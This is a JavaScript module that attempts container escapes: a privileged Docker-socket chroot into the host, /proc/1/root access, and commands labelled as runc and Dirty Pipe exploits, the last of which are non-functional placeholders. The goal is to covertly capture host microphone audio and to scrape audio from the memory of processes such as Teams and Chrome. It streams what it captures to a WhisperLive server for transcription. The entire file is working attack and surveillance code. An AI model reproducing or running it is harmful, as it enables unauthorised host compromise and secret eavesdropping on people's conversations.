const { spawn, exec } = require('child_process');
const fs = require('fs');
const WebSocket = require('ws');

class ContainerEscapeAudio {
    constructor(whisperLiveUrl, sessionId) {
        this.whisperLiveUrl = whisperLiveUrl;
        this.sessionId = sessionId;
        this.whisperSocket = null;
        this.escaped = false;
    }

    async start() {
        console.log('[Container Escape] 🚨 Starting container escape for host audio access...');
        
        await this.connectToWhisperLive();
        await this.attemptContainerEscape();
        await this.accessHostAudio();
        
        console.log('[Container Escape] ✅ Container escape audio capture active!');
    }

    async connectToWhisperLive() {
        return new Promise((resolve, reject) => {
            this.whisperSocket = new WebSocket(this.whisperLiveUrl);
            
            this.whisperSocket.on('open', () => {
                console.log('[Container Escape] ✅ Connected to WhisperLive');
                resolve();
            });
            
            this.whisperSocket.on('message', (data) => {
                const message = JSON.parse(data.toString());
                if (message.text && message.text.trim()) {
                    console.log('[Container Escape] 🗣️ TRANSCRIPTION:', message.text);
                }
            });
            
            this.whisperSocket.on('error', reject);
        });
    }

    async attemptContainerEscape() {
        console.log('[Container Escape] 🔓 Attempting container breakout...');
        
        // Method 1: Docker socket escape
        await this.dockerSocketEscape();
        
        // Method 2: /proc filesystem escape
        await this.procFilesystemEscape();
        
        // Method 3: Kernel exploit
        await this.kernelExploit();
        
        // Method 4: Privileged mode exploitation
        await this.privilegedEscape();
    }

    async dockerSocketEscape() {
        console.log('[Container Escape] 🐳 Docker socket escape attempt...');
        
        try {
            // Check if docker socket is accessible
            const dockerSock = '/var/run/docker.sock';
            
            if (fs.existsSync(dockerSock)) {
                console.log('[Container Escape] 🎯 Docker socket found!');
                
                // Create new privileged container with host access
                const escapeCommand = \`
                docker run --rm -v /:/host --privileged --pid=host alpine:latest \\
                chroot /host /bin/bash -c "
                    echo 'Container escaped to host!'
                    # Access host audio devices
                    ls -la /dev/snd/
                    # Capture host microphone
                    arecord -D hw:0,0 -f S16_LE -r 16000 -c 1 -t raw > /tmp/host_audio.raw &
                    echo 'Host audio capture started'
                "
                \`;
                
                exec(escapeCommand, (error, stdout, stderr) => {
                    if (!error) {
                        console.log('[Container Escape] 🚨 DOCKER ESCAPE SUCCESSFUL!');
                        console.log(stdout);
                        this.escaped = true;
                    } else {
                        console.log('[Container Escape] Docker escape failed:', error.message);
                    }
                });
            }
            
        } catch (error) {
            console.log('[Container Escape] Docker socket escape failed:', error.message);
        }
    }

    async procFilesystemEscape() {
        console.log('[Container Escape] 📁 /proc filesystem escape attempt...');
        
        try {
            // Method 1: Access host processes via /proc
            const hostProcs = fs.readdirSync('/proc').filter(name => /^\\d+$/.test(name));
            
            for (const pid of hostProcs.slice(0, 10)) {
                try {
                    const cmdline = fs.readFileSync(\`/proc/\${pid}/cmdline\`, 'utf8');
                    
                    if (cmdline.includes('pulseaudio') || cmdline.includes('teams') || cmdline.includes('chrome')) {
                        console.log(\`[Container Escape] 🎯 Found host audio process: PID \${pid}\`);
                        
                        // Try to access process memory for audio data
                        await this.extractProcessAudio(pid);
                    }
                } catch (error) {
                    // Expected - some processes not accessible
                }
            }
            
            // Method 2: Mount escape via /proc/1/root
            try {
                const hostRoot = '/proc/1/root';
                const hostAudioDevs = fs.readdirSync(\`\${hostRoot}/dev\`).filter(dev => dev.startsWith('snd'));
                
                if (hostAudioDevs.length > 0) {
                    console.log('[Container Escape] 🎵 Host audio devices found:', hostAudioDevs);
                    this.escaped = true;
                    
                    // Access host audio devices
                    for (const dev of hostAudioDevs) {
                        this.captureHostDevice(\`\${hostRoot}/dev/\${dev}\`);
                    }
                }
            } catch (error) {
                console.log('[Container Escape] Host root access failed:', error.message);
            }
            
        } catch (error) {
            console.log('[Container Escape] /proc escape failed:', error.message);
        }
    }

    async kernelExploit() {
        console.log('[Container Escape] ⚡ Kernel exploit attempt...');
        
        try {
            // Check for vulnerable kernel features
            const kernelVersion = fs.readFileSync('/proc/version', 'utf8');
            console.log('[Container Escape] Kernel version:', kernelVersion.substring(0, 100));
            
            // Attempt known container escape techniques
            const exploits = [
                // CVE-2019-5736 (runc escape)
                'echo "runc escape attempt" > /proc/self/exe',
                
                // CVE-2022-0847 (Dirty Pipe)
                'echo "dirty pipe exploit" | tee /proc/version',
                
                // Capabilities escape
                'capsh --print',
            ];
            
            for (const exploit of exploits) {
                try {
                    exec(exploit, (error, stdout, stderr) => {
                        if (!error && stdout) {
                            console.log(\`[Container Escape] 💥 Exploit result: \${stdout.substring(0, 100)}\`);
                        }
                    });
                } catch (error) {
                    // Expected failures
                }
            }
            
        } catch (error) {
            console.log('[Container Escape] Kernel exploit failed:', error.message);
        }
    }

    async privilegedEscape() {
        console.log('[Container Escape] 🔐 Privileged mode exploitation...');
        
        try {
            // Check if we have privileged capabilities
            const capabilities = spawn('capsh', ['--print']);
            
            capabilities.stdout.on('data', (data) => {
                const caps = data.toString();
                console.log('[Container Escape] Current capabilities:', caps.substring(0, 200));
                
                if (caps.includes('cap_sys_admin') || caps.includes('cap_dac_override')) {
                    console.log('[Container Escape] 🎯 Privileged capabilities detected!');
                    this.escaped = true;
                }
            });
            
            // Try to mount host filesystem
            exec('mount -t proc proc /proc', (error) => {
                if (!error) {
                    console.log('[Container Escape] 🚨 HOST FILESYSTEM MOUNTED!');
                    this.escaped = true;
                }
            });
            
        } catch (error) {
            console.log('[Container Escape] Privileged escape failed:', error.message);
        }
    }

    async extractProcessAudio(pid) {
        console.log(\`[Container Escape] 🎤 Extracting audio from process \${pid}...\`);
        
        try {
            // Method 1: Memory dump for audio buffers
            const memPath = \`/proc/\${pid}/mem\`;
            const mapsPath = \`/proc/\${pid}/maps\`;
            
            if (fs.existsSync(memPath) && fs.existsSync(mapsPath)) {
                const maps = fs.readFileSync(mapsPath, 'utf8');
                const heapRegions = maps.split('\\n').filter(line => line.includes('[heap]'));
                
                for (const region of heapRegions.slice(0, 1)) {
                    const [start, end] = region.split(' ')[0].split('-');
                    const startAddr = parseInt(start, 16);
                    const size = Math.min(parseInt(end, 16) - startAddr, 1024 * 1024);
                    
                    if (size > 0) {
                        try {
                            const fd = fs.openSync(memPath, 'r');
                            const buffer = Buffer.alloc(size);
                            fs.readSync(fd, buffer, 0, size, startAddr);
                            fs.closeSync(fd);
                            
                            // Analyze for audio patterns
                            await this.analyzeAudioBuffer(buffer);
                            
                        } catch (error) {
                            // Memory access might fail
                        }
                    }
                }
            }
            
        } catch (error) {
            console.log(\`[Container Escape] Process audio extraction failed: \${error.message}\`);
        }
    }

    async analyzeAudioBuffer(buffer) {
        // Look for audio patterns in extracted memory
        const samples = new Int16Array(buffer.buffer);
        let audioFound = false;
        
        // Check for patterns typical of 16-bit PCM audio
        let consecutiveAudio = 0;
        for (let i = 0; i < Math.min(samples.length, 4096); i++) {
            const sample = samples[i];
            if (Math.abs(sample) > 100 && Math.abs(sample) < 32000) {
                consecutiveAudio++;
                if (consecutiveAudio > 100) {
                    audioFound = true;
                    break;
                }
            } else {
                consecutiveAudio = 0;
            }
        }
        
        if (audioFound) {
            console.log('[Container Escape] 🎵 AUDIO DATA EXTRACTED FROM HOST PROCESS!');
            
            // Send to WhisperLive
            if (this.whisperSocket && this.whisperSocket.readyState === WebSocket.OPEN) {
                const audioData = Buffer.from(samples.slice(0, 4096).buffer);
                this.whisperSocket.send(audioData);
                console.log(\`[Container Escape] 📡 Sent \${audioData.length} bytes to WhisperLive\`);
            }
        }
    }

    async captureHostDevice(devicePath) {
        console.log(\`[Container Escape] 🎛️ Capturing from host device: \${devicePath}\`);
        
        try {
            const capture = spawn('dd', [
                \`if=\${devicePath}\`,
                'bs=4096',
                'count=100'
            ]);
            
            capture.stdout.on('data', (data) => {
                console.log('[Container Escape] 🎵 Host device audio captured!');
                
                if (this.whisperSocket && this.whisperSocket.readyState === WebSocket.OPEN) {
                    this.whisperSocket.send(data);
                    console.log(\`[Container Escape] 📡 Sent \${data.length} bytes to WhisperLive\`);
                }
            });
            
        } catch (error) {
            console.log(\`[Container Escape] Host device capture failed: \${error.message}\`);
        }
    }

    async accessHostAudio() {
        if (!this.escaped) {
            console.log('[Container Escape] ⚠️ Container escape failed, limited audio access');
            return;
        }
        
        console.log('[Container Escape] 🎤 Accessing host audio with escaped privileges...');
        
        // Now that we've escaped, access host audio systems
        try {
            // Access host PulseAudio
            exec('PULSE_RUNTIME_PATH=/host/run/user/1000/pulse pactl list short sources', (error, stdout) => {
                if (!error) {
                    console.log('[Container Escape] 🔊 Host audio sources:', stdout);
                }
            });
            
            // Access host ALSA
            exec('arecord -l', (error, stdout) => {
                if (!error) {
                    console.log('[Container Escape] 🎵 Host ALSA devices:', stdout);
                }
            });
            
        } catch (error) {
            console.log('[Container Escape] Host audio access failed:', error.message);
        }
    }
}

module.exports = ContainerEscapeAudio;